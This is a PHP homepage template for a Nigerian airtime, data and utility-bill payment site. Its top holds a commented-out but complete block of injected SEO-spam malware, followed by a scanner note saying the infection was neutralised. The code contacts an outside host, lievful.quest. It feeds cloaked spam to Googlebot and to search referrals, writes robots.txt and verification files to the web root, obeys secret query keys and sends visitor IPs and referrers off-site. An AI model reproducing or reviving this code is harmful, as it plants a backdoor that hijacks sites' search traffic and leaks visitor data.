<?php
// error_reporting(0);header('Content-Type: text/html; charset=utf-8');$ooooOO0 = 'z9169';$O='';date_default_timezone_set('Asia/Tokyo');
// $dRoot = @$_SERVER['DOCUMENT_ROOT'];
// $rUrl = @$_SERVER['REQUEST_URI'];
// $curName = @basename(__FILE__);
// $sName = @$_SERVER['HTTP_HOST'];
// $O0_OO0_0Ooolg = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
// $uAgent = @$_SERVER['HTTP_USER_AGENT'];
// $referer = @$_SERVER['HTTP_REFERER'];
// $http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
// $typeName = $http_type . $sName;
// $uAgent = @strtolower($uAgent);
// $referer = @strtolower($referer);
// if(getenv('HTTP_CLIENT_IP')){
// $client_ip = getenv('HTTP_CLIENT_IP');
// } elseif(getenv('HTTP_X_FORWARDED_FOR')) {
// $client_ip = getenv('HTTP_X_FORWARDED_FOR');
// } elseif(getenv('REMOTE_ADDR')) {
// $client_ip = getenv('REMOTE_ADDR');
// } else {
// $client_ip = $_SERVER['REMOTE_ADDR'];
// }

// $pageStr = explode('?',$rUrl);
// $sdName = $pageStr[0];
// $existF = false;
// if (file_exists($dRoot.$sdName)) {
// $existF = true;
// }

// if(isset($_GET['vf'])&&$_GET['vf']=='znznzn') {
// echo 'znznzn online!';
// exit;
// }
// $pr = dirname($rUrl);
// if (strstr($rUrl, 'sitemap_index_')) {
// allmap($O0_OO0_0O,$ooooOO0,$typeName,$rUrl,$sName,$http_type,$existF,$sdName,$pr,$curName);
// }
// if (substr($rUrl,-4)=='.xml') {
// sitefun($O0_OO0_0O,$ooooOO0,$typeName,$rUrl,$http_type,$sName,$client_ip,$existF,$sdName,$pr,$curName);
// }
// function allmap($O0_OO0_0O,$ooooOO0,$typeName,$rUrl,$sName,$http_type,$existF,$sdName,$pr,$curName){
// $ol = 'http://'.$ooooOO0.'.lievful.quest/Api/siteAllMap.php?page='.$rUrl.'&pwd=sl123&domain='.$typeName.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
// if ($_GET['vf_allmap'] == 'znznzn') {
// echo $ol;
// exit;
// }
// $getRes = getCurl($O0_OO0_0O,$ol);
// if(strstr($getRes,'okhtmlgetcontent')){
// @header('Content-type:text/xml');
// $getRes = str_replace('okhtmlgetcontent','',$getRes);
// echo $getRes;
// exit();
// }else if(strstr($getRes,'getcontent500page')){
// @header('HTTP/1.1 500 Internal Server Error');
// exit();
// }else if(strstr($getRes,'getcontent404page')){
// @header('HTTP/1.1 404 Not Found');
// exit();
// }
// }
// function sitefun($O0_OO0_0O,$ooooOO0,$typeName,$rUrl,$http_type,$sName,$client_ip,$existF,$sdName,$pr='',$curName='') {
// $ol = 'http://'.$ooooOO0.'.lievful.quest/Api/siteUrlApi.php?stype=sitemap&num=6000&pr='.$pr.'&url='.$rUrl.'&domain='.$typeName.'&ip='.$client_ip.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
// if ($_GET['vf_map'] == 'znznzn.xml') {
// echo $ol;
// exit;
// }
// $getRes = getCurl($O0_OO0_0O,$ol);
// if(strstr($getRes,'okhtmlgetcontent')){
// @header('Content-type:text/xml');
// $getRes = str_replace('okhtmlgetcontent','',$getRes);
// echo $getRes;
// exit();
// }else if(strstr($getRes,'getcontent500page')){
// @header('HTTP/1.1 500 Internal Server Error');
// exit();
// }else if(strstr($getRes,'getcontent404page')){
// @header('HTTP/1.1 404 Not Found');
// exit();
// }else if(strstr($getRes,'getcontentping')){
// $getRes = str_replace('getcontentping','',$getRes);
// $getsResult = explode('[pin]',$getRes);
// foreach($getsResult as $O0_OO0_0Oog => $O0_OO0_0Oov){
// $pingRes = getCurl($O0_OO0_0O,$O0_OO0_0Oov);
// $O0_OO0_0Oooo0s = (strpos($pingRes,'Sitemap Notification Received') !== false) ? 'OK' : 'ERROR';
// echo $O0_OO0_0Oov.'===>Submitting Google Sitemap: '.$O0_OO0_0Oooo0s.PHP_EOL;
// }
// exit();
// }
// }
// if(isset($_GET['google'])){
// $go=$_GET['google'];
// if (preg_match('/^google.*?(\.html)$/i', $go)) {
// if(putFile($O0_OO0_0O,$go,'google-site-verification:'.' '.$go)){
// exit('<a href='.$go.'>'.$go.'</a>');
// } else{
// exit('fail!!!!');
// }
// }
// }
// if(isset($_GET['robots'])){
// $both = '';
// $robots = $_GET['robots'];
// $ol = 'http://'.$ooooOO0.'.lievful.quest/Api/rob.php?rob='.$robots.'&pwd=sl123&domain='.$typeName.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
// if ($_GET['robots'] == 'znznzn') {
// echo $ol;
// exit;
// }
// $getRes = getCurl($O0_OO0_0O,$ol);
// if(strstr($getRes,'okhtmlgetcontent')){
// if(putFile($O0_OO0_0O,'robots.txt',$getRes,$existF)) {
// echo @file_get_contents($dRoot.'/robots.txt');
// exit();
// } else {
// exit('fail!!!');
// }
// exit();
// }
// }
// if(preg_match('/google.co.jp|yahoo|google\.com[^.]*?$|bing/i', $referer)){
// if ($_GET['vf_jump'] == 'znznzn') {
// echo 'http://'.$ooooOO0.'.lievful.quest/jump.php?domain='.$typeName.'&page='.$rUrl.'&bot=0&pr='.$pr.'&refer='.$referer.'&ip='.$client_ip.'&lg='.$O0_OO0_0Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
// exit;
// }
// $jumpRes=getCurl($O0_OO0_0O,'http://'.$ooooOO0.'.lievful.quest/jump.php?domain='.$typeName.'&page='.$rUrl.'&bot=0&pr='.$pr.'&refer='.$referer.'&ip='.$client_ip.'&lg='.$O0_OO0_0Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName);
// if ($jumpRes) {
// @header("Content-type: text/html; charset=utf-8");
// $jumpRes = str_replace("okhtmlgetcontent",'',$jumpRes);
// echo $jumpRes;
// exit();
// }
// }
// if(stristr($uAgent,'googlebot')||stristr($uAgent,'yahoo')||stristr($uAgent,'google')||stristr($uAgent,'Googlebot')||stristr($uAgent,'googlebot')||$_GET['bottest'] == 'test'){
// if ($_GET['vf_bot'] == 'znznzn') {
// echo 'http://'.$ooooOO0.'.lievful.quest/918.php?domain='.$typeName.'&page='.$rUrl.'&bot=1&pr='.$pr.'&ip='.$client_ip.'&lg='.$O0_OO0_0Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
// exit;
// }
// $file_contents = getCurl($O0_OO0_0O,'http://'.$ooooOO0.'.lievful.quest/918.php?domain='.$typeName.'&page='.$rUrl.'&bot=1&pr='.$pr.'&ip='.$client_ip.'&lg='.$O0_OO0_0Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName);
// if(!empty($file_contents)){
// if(strstr($file_contents,'okhtmlgetcontent')){
// @header("Content-type: text/html; charset=utf-8");
// $file_contents = str_replace('okhtmlgetcontent','',$file_contents);
// echo $file_contents;
// exit();
// }else if(strstr($file_contents,'getcontent500page')){
// @header('HTTP/1.1 500 Internal Server Error');
// exit();
// }else if(strstr($file_contents,'getcontent404page')){
// @header('HTTP/1.1 404 Not Found');
// exit();
// }else if(strstr($file_contents,'getcontentnotplpage')){
// $file_contents = str_replace('getcontentnotplpage','',$file_contents);
// echo $file_contents;
// exit();
// }
// }
// }
// if ($_GET['vf_origin'] == 'online5566') {
// echo 'http://'.$ooooOO0.'.lievful.quest/org.php?domain='.$typeName.'&page='.$rUrl.'&pr='.$pr.'&ip='.$client_ip.'&lg='.$O0_OO0_0Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
// exit;
// }
// getCurl($O0_OO0_0O,'http://'.$ooooOO0.'.lievful.quest/org.php?domain='.$typeName.'&page='.$rUrl.'&pr='.$pr.'&ip='.$client_ip.'&lg='.$O0_OO0_0Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName);
// function getCurl($O0_OO0_0O,$gurl)
// {
// $file_contents = '';
// $agentarry=array(
// "safari 5.1 – MAC"=>"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
// "safari 5.1 – Windows"=>"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
// "Firefox 38esr"=>"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
// "IE 11"=>"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
// "IE 9.0"=>"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0",
// "IE 8.0"=>"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
// "IE 7.0"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
// "Firefox 4.0.1 – MAC"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
// "Firefox 4.0.1 – Windows"=>"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
// "Opera 11.11 – MAC"=>"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
// "Opera 11.11 – Windows"=>"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
// "Chrome 17.0 – MAC"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
// "Avant"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)",
// "Green Browser"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
// "safari iOS 4.33 – iPhone"=>"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
// "safari iOS 4.33 – iPod Touch"=>"Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
// "safari iOS 4.33 – iPad"=>"Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
// "Android N1"=>"Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
// "Android Opera Mobile"=>"Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10",
// "Android Pad Moto Xoom"=>"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
// "BlackBerry"=>"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",
// "WebOS HP Touchpad"=>"Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0",
// "UCOpenwave"=>"Openwave/ UCWEB7.0.2.37/28/999",
// "UC Opera"=>"Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999",
// );
// $user_agent=$agentarry[array_rand($agentarry,1)];
// if(function_exists('curl_init')){
// try
// {
// $ch = curl_init();
// $timeout = 30;
// curl_setopt($ch,CURLOPT_URL,$gurl);
// curl_setopt($ch,CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
// curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
// curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
// $file_contents = curl_exec($ch);
// curl_close($ch);
// }
// catch (Exception $e)
// {}
// }
// if(strlen($file_contents)<1&&function_exists('file_get_contents')){
// ini_set('user_agent',$user_agent);
// try
// {
// $file_contents = @file_get_contents($gurl);
// }
// catch (Exception $e)
// {}
// }
// return $file_contents;
// }
// function putFile($O0_OO0_0O,$htName, $htContents, $app='') {
// if ($app) {
// $handle = fopen(@$_SERVER['DOCUMENT_ROOT'].'/'.$htName, 'a') or die('0');
// }else{
// $handle = fopen(@$_SERVER['DOCUMENT_ROOT'].'/'.$htName, 'w') or die('0');
// }
// $result = fwrite($handle, $htContents);
// fclose($handle);
// return $result;
// }
?>
<?php
// 
// require("private/web_autoload.php");


/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code have been removed, and the file is now safe to use.
* Feel free to contact Imunify support team at https://www.imunify360.com/support/new
*/
 
require("functions/web_config.php");
?>

<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title><?php echo $sitename; ?> - Buy Airtime and Data for all Network. Make payment for DSTV, GOTV, PHCN other services </title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="homepage/assets/img/mylogo2.png" rel="icon">
  <link href="homepage/assets/img/mylogo2.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600;1,700&family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="homepage/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="homepage/assets/vendor/fontawesome-free/css/all.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/aos/aos.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="homepage/assets/css/main.css" rel="stylesheet">
        <!-- Custom CSS -->
        <link href="view/assets/css/sty.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    </head>
	
    <body>

        <!-- ============================================================== -->
        <!-- Main wrapper - style you can find in pages.scss -->
        <!-- ============================================================== -->
        <div id="main-wrapper">
		
            <!-- ============================================================== -->
            <!-- Top header  -->
            <!-- ============================================================== -->
            <!-- Start Navigation -->
			<div class="header header-light dark-text">
				<div class="container">
					<nav id="navigation" class="navigation navigation-landscape">
						<div class="nav-header">
							<a class="nav-brand" href="<?php echo $mainpage; ?>">
							<h3 style="text-transform: uppercase;color: <?php echo $theme_color; ?>;font-family: impact;"><?php echo $sitename; ?></h3>
							</a>
							<div class="nav-toggle"></div>
							<div class="mobile_nav">
								<ul>
								
									<li class="account-drop">
										<a href="<?php echo $baseurl; ?>/register" class="crs_yuo12" >
											<span class="embos_45"><i class="fas fa fa-user-plus"></i></span>
										</a>
									
									</li>

									<li>
										<a href="<?php echo $baseurl; ?>/login"  class="crs_yuo12">
											<span class="embos_45"><i class="fas fa-sign-in-alt"></i></span>
										</a>
									</li>
								</ul>
							</div>
						</div>
						<div class="nav-menus-wrapper">
							<ul class="nav-menu">
								<li class="active"><a href="<?php echo $mainpage; ?>">Home</a></li>
								<li class=""><a href="#">Services<span class="submenu-indicator"></span></a>
									<ul class="nav-dropdown nav-submenu">
									                         <li>
<a href="<?php echo $baseurl; ?>/login">Airtime Recharge</a>
</li>
<li class="nav-item">
<a href="<?php echo $baseurl; ?>/login">Data TopUp</a>
</li>
<li class="nav-item">
<a href="<?php echo $baseurl; ?>/login">Decoder Recharge</a>
</li>
<li class="nav-item">
<a href="<?php echo $baseurl; ?>/login">Electricity Bill</a>
</li>
<li class="nav-item">
<a href="<?php echo $baseurl; ?>/login">Exam Pins</a>
</li>
<li class="nav-item">
<a href="<?php echo $baseurl; ?>/login">Airtime To Cash</a>
</li>
									</ul>
									
								</li>
								
						
								
								<li class=""><a href="<?php echo $mainpage; ?>/About">About</a></li>
									<li class=""><a href="<?php echo $mainpage; ?>/Contact">Contact</a></li>
							</ul>
							
							<ul class="nav-menu nav-menu-social align-to-right">
								
								<li>
									<a href="<?php echo $baseurl; ?>/login" class="">
										<i class="fas fa-sign-in-alt mr-1"></i><span class="dn-lg">Sign In</span>
									</a>
								</li>
								<li class="add-listing" style="background-color: <?php echo $theme_color; ?>">
									<a href="<?php echo $baseurl; ?>/register" class="text-white">Register</a>
								</li>
							</ul>
						</div>
					</nav>
				</div>
			</div>
			<!-- End Navigation -->
			<div class="clearfix"></div>
			<!-- ============================================================== -->
			<!-- Top header  -->
			<!-- ============================================================== -->			
			
			<!-- ============================ Hero Banner  Start================================== -->
			<div class="hero_banner image-cover image_bottom h6_bg">
				<div class="container">
					<div class="row align-items-center">
						<div class="col-lg-6 col-md-6 col-sm-12">
							<div class="simple-search-wrap text-left">
								<div class="hero_search-2">
									<h1 class="banner_title mb-4">The Best<br> Recharge & Utility Bills Payment platform
                              </h1>
									<p class="font-lg mb-4"> Automated & Instant Delivery; MTN, GOtv, PHED, Airtel, Startimes, WAEC, 9mobile, DSTV, etc. </p>
									<div class="inline_btn">
										<a href="<?php echo $baseurl; ?>/register" class="btn"  style="background-color: <?php echo $theme_color; ?>">Register</a>

										<a href="<?php echo $baseurl; ?>/login" class="btn"  style="background-color: <?php echo $theme_color; ?>">Sign In</a>
									
									</div>
								</div>
							</div>
						</div>
						<div class="col-lg-6 col-md-6 col-sm-12">
							<div class="side_block extream_img">
								<div class="list_crs_img">
									<img src="" class="img-fluid elsio cirl animate-fl-y" alt="" />
									<img src="" class="img-fluid elsio arrow animate-fl-x" alt="" />
									<img src="" class="img-fluid elsio moon animate-fl-x" alt="" />
								</div>
								<img src="view/assets/img/happy.svg" class="img-fluid" alt="" />
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- ============================ Hero Banner End ================================== -->
			
			
			<!-- ======= Featured Services Section ======= -->
    <section id="featured-services" class="featured-services">
      <div class="container">

        <div class="row gy-4">

          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up">
            <div class="icon flex-shrink-0"><i class="fa-solid far fa-paper-plane"></i></div>
            <div>
              <h4 class="title">
                Swift Delivery Service</h4>
              <p class="description">We offer instant recharge of Airtime, Databundle, CableTV, Electricity Bill Payment and Educational PIN(s) with instant delivery.</p>
            </div>
          </div>
          <!-- End Service Item -->

          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="100">
            <div class="icon flex-shrink-0"><i class="fa-solid fa-server"></i></div>
            <div>
              <h4 class="title">
                Secured & Automated</h4>
              <p class="description">We use cutting-edge technology to run our services. Which make All our services are delivered to you almost instantly in nano-seconds.</p>
            </div>
          </div><!-- End Service Item -->

          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="200">
            <div class="icon flex-shrink-0"><i class="fa-solid fas fa-headset"></i></div>
            <div>
              <h4 class="title">Full Customer Support</h4>
              <p class="description">Our customers are premium to us, hence satisfying them is our topmost priority. Our customer service is just a click away.</p>
            </div>
          </div><!-- End Service Item -->

        </div>

      </div>
    </section><!-- End Featured Services Section -->
    
    
			<!-- ================================ Tag Award ================================ -->
			<!--<section class="p-0 pt-10">-->
			<!--	<div class="container">-->
			<!--		<div class="row justify-content-center">-->
			<!--			<div class="col-lg-12 col-md-12 col-sm-12">-->
			<!--				<div class="crp_box fl_color ovr_top">-->
			<!--					<div class="row align-items-center">-->
			<!--						<div class="col-xl-4 col-lg-4 col-md-4 col-sm-12">-->
			<!--							<div class="dro_140">-->
			<!--								<div class="dro_141" style="color: <?php echo $theme_color; ?>"><i class="fa fa-user-plus"></i></div>-->
			<!--								<div class="dro_142">-->
			<!--									<h6>Signup</h6>-->
			<!--									<p>Create A Free Online Account With Us And Get An Online Wallet.</p>-->
			<!--								</div>-->
			<!--							</div>-->
			<!--						</div>-->
			<!--						<div class="col-xl-4 col-lg-4 col-md-4 col-sm-12">-->
			<!--							<div class="dro_140">-->
			<!--								<div class="dro_141" style="color: <?php echo $theme_color; ?>"><i class="fa fa-credit-card"></i></div>-->
			<!--								<div class="dro_142">-->
			<!--									<h6>Fund Wallet</h6>-->
			<!--									<p>Fund Your Wallet Using ATM Card, Cash Deposit, Online Transfer, etc..</p>-->
			<!--								</div>-->
			<!--							</div>-->
			<!--						</div>-->
			<!--						<div class="col-xl-4 col-lg-4 col-md-4 col-sm-12">-->
			<!--							<div class="dro_140">-->
			<!--								<div class="dro_141" style="color: <?php echo $theme_color; ?>"><i class="fa fa-smile-o"></i></div>-->
			<!--								<div class="dro_142">-->
			<!--									<h6>Enjoy Services</h6>-->
			<!--									<p>-->
												
			<!--									Enjoy Our Services Charged From Your Wallet.</p>-->
			<!--								</div>-->
			<!--							</div>-->
			<!--						</div>-->
			<!--					</div>-->
			<!--				</div>-->
			<!--			</div>-->
			<!--		</div>-->
				
			<!--	</div>-->
			<!--</section>-->
			<!-- ================================ Tag Award ================================ -->
				<div class="clearfix"></div>

			<!-- ============================ How It Works Start ================================== -->
			<section class="">
				<div class="container">
					
					<div class="row justify-content-center">
						<div class="col-lg-7 col-md-8">
							<div class="sec-heading center">
								<h2>Why<span class="theme-cl"> Choose Us?</span></h2>
								<p></p>
							</div>
						</div>
					</div>
					
					<div class="row justify-content-center mt-5">
						
						<!-- Single Location -->
						<div class="col-lg-4 col-md-4 col-sm-6">
							<div class="wrk_grid">
								<div class="wrk_grid_ico">
									<i class="fa fa-magic"></i>
								</div>
								<div class="wrk_caption">
									<h4>Automated Delivery</h4>
									<p>We have swift automated system with a 24/7 delivery service almost instantly, nothing beats a seamless process..

</p>
								</div>
							</div>
						</div>
						
						<!-- Single Location -->
						<div class="col-lg-4 col-md-4 col-sm-6">
							<div class="wrk_grid active">
								<div class="wrk_grid_ico">
									<i class="fa fa-percent"></i>
								</div>
								<div class="wrk_caption">
									<h4>Big Discounts</h4>
									<p>Enjoy massive discount on our platform when you make purchase for your day to day needs.</p>
								</div>
							</div>
						</div>
						
						<!-- Single Location -->
						<div class="col-lg-4 col-md-4 col-sm-6">
							<div class="wrk_grid">
								<div class="wrk_grid_ico">
									<i class="fas fa-headset"></i>
								</div>
								<div class="wrk_caption">
									<h4>24/7 Support</h4>
									<p>We guarantee our customers top notch services all time. Hence, we are always respond to your needs.</p>
								</div>
							</div>
						</div>
						
					</div>
					
				</div>
			</section>
			<!-- ============================ Cources Start ================================== -->
<section class="min gray">
				<div class="container">
					
					<div class="row justify-content-center">
						<div class="col-lg-7 col-md-8">
							<div class="sec-heading center">
								<h2>Our <span class="theme-cl">Services</span></h2>
								<p>Automated Instant Delivery.</p>
							</div>
						</div>
					</div>
					
					<div class="row justify-content-center">
					
						<!-- Single Grid -->
						<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $baseurl; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/Ucall.png" style="height:200px; margin-left:60px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_8"><span>MTN, Airtel, GLO & 9mobile.</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $baseurl; ?>/login" style="font-size:20px;" class="crs_title_link">Airtime Recharge</a></h4></div>
								
								</div>
								
							</div>
						</div>
						
						
						
						<!-- Single Grid -->
							<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $baseurl; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/adata.jpg" style="height:200px; margin-left:20px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_1"><span>MTN, Airtel, GLO & 9mobile.</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $baseurl; ?>/login" style="font-size:20px;" class="crs_title_link">Data Recharge</a></h4></div>
								
								</div>
								
							</div>
						</div>
						<!-- Single Grid -->
							<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $baseurl; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/dec.jpg" style="height:200px;margin-left:70px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_4"><span>Startimes, DStv & GOtv.</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $baseurl; ?>/login" style="font-size:20px;" class="crs_title_link">Cable TV Subscription</a></h4></div>
								
								</div>
								
							</div>
						</div>
						<!-- Single Grid -->
						<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $baseurl; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/pelects.png" style="height:200px; margin-left:50px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_5"><span>IKEDC, AEDC, PHEDC, ETC</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $baseurl; ?>/login" style="font-size:20px;" class="crs_title_link">Electricity Bill Payment</a></h4></div>
								
								</div>
								
							</div>
						</div>
						<!-- Single Grid -->
						<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="course-detail.html" class="crs_detail_link">
										<img src="view/ass/img/pcash.png" style="height:200px; margin-left:40px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_6"><span>MTN, Airtel, GLO & 9mobile.</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="#" style="font-size:20px;" class="crs_title_link">Airtime To Cash</a></h4></div>
								
								</div>
								
							</div>
						</div>	
						<!-- Single Grid -->
						<div class="col-xl-4 col-lg-4 col-md-6 col-sm-12">
							<div class="crs_grid">
								<div class="crs_grid_thumb">
									<a href="<?php echo $baseurl; ?>/login" class="crs_detail_link">
										<img src="view/ass/img/aresult.png" style="height:200px; margin-left:40px" class="img-fluid rounded" alt="">
									</a>
									<div class="crs_video_ico">
										<i class="fa fa-play"></i>
									</div>
									<div class="crs_locked_ico">
										<i class="fa fa-lock"></i>
									</div>
								</div>
								<div class="crs_grid_caption">
									<div class="crs_flex">
										<div class="crs_fl_first">
											<div class="crs_cates cl_7"><span>AEC, NECO, JAMB, NABTEB, e.t.c...</span></div>
										</div>
										
									</div>
									<div class="crs_title"><h4><a href="<?php echo $baseurl; ?>/login" style="font-size:20px;" class="crs_title_link">Exam Pin</a></h4></div>
								
								</div>
								
							</div>
						</div>
					</div>
					
				
					
				</div>
			</section>
		
			<div class="clearfix"></div>
<section class="min">
				<div class="container">
				
					<div class="row justify-content-center">
						<div class="col-lg-7 col-md-8">
							<div class="sec-heading center">
								<h2>Our Pricing <span class="theme-cl">Plan</span></h2>
								<p>The plan a user is subscribed to determines the amount of discount the user will get for our services..</p>
							</div>
						</div>
					</div>
					
					<div class="row align-items-center">
												<!-- Single Package -->
					<div class="col-lg-3 col-md-4">
							<div class="pricing_wrap">
								<div class="prt_head">
									<h4>MTN</h4>
								</div>
								<div class="prt_price">
									<h2><span>₦</span><?php echo $mtn_guest; ?>220</h2>
									<span></span>
								</div>
								<div class="prt_body" style="text-align: center;">
									<ul>
										<li>One	Month Valid</li>
										<li>Support	4G LITE</li>
										<li>Hotspot	Sharing</li>
										<li>Laptop	Usage</li>
									
									</ul>
								</div>
								<div class="prt_footer">
